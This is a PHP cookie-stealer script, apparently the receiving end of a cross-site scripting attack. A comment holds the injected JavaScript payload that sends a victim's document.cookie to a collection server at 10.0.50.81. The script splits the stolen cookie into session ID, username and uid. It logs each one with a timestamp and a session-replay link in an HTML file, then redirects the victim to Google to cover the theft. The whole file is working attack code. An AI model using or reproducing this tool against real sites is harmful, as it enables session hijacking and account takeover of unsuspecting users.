 <?php
date_default_timezone_set("Asia/Kolkata");
 //<script>document.location='http://10.0.50.81/cookie/index.php?cookie='.concat(escape(document.cookie));</script>
$cookie=$_GET["cookie"];     
//$cookiet = trim($cookie," ");
$cookie = str_replace(' ', '', $cookie);


list($ses, $show, $usr, $uid) = explode(";", $cookie); 

//echo $show;

$show =  trim($show,"showhints=");
$usr = ltrim($usr,"username");
$usr = ltrim($usr,"=");
$uid = trim($uid,"uid=");
$ses = trim($ses," PHPSESSID=");


$path = "<a href=http://10.0.50.81/cookie/create.php?cookie=";
$text = ">~:Co0k!E:~</a>";
$file=fopen('install.html','a');
//fwrite($file,"<?php");
//fwrite($file,"\n");
fwrite($file,"<html>");
fwrite($file,"\n");
fwrite($file,$path.$cookie.$text." | ".date("d/m/Y")." | ".date("h:i:sa")."  [".$usr."]");
fwrite($file,"\n");
fwrite($file,"</br>");
fwrite($file,"</html>");
fwrite($file,"\n");
//fwrite($file,"? >");
fwrite($file,"\n");
fclose($file);
header("Location: http://google.com");
?>

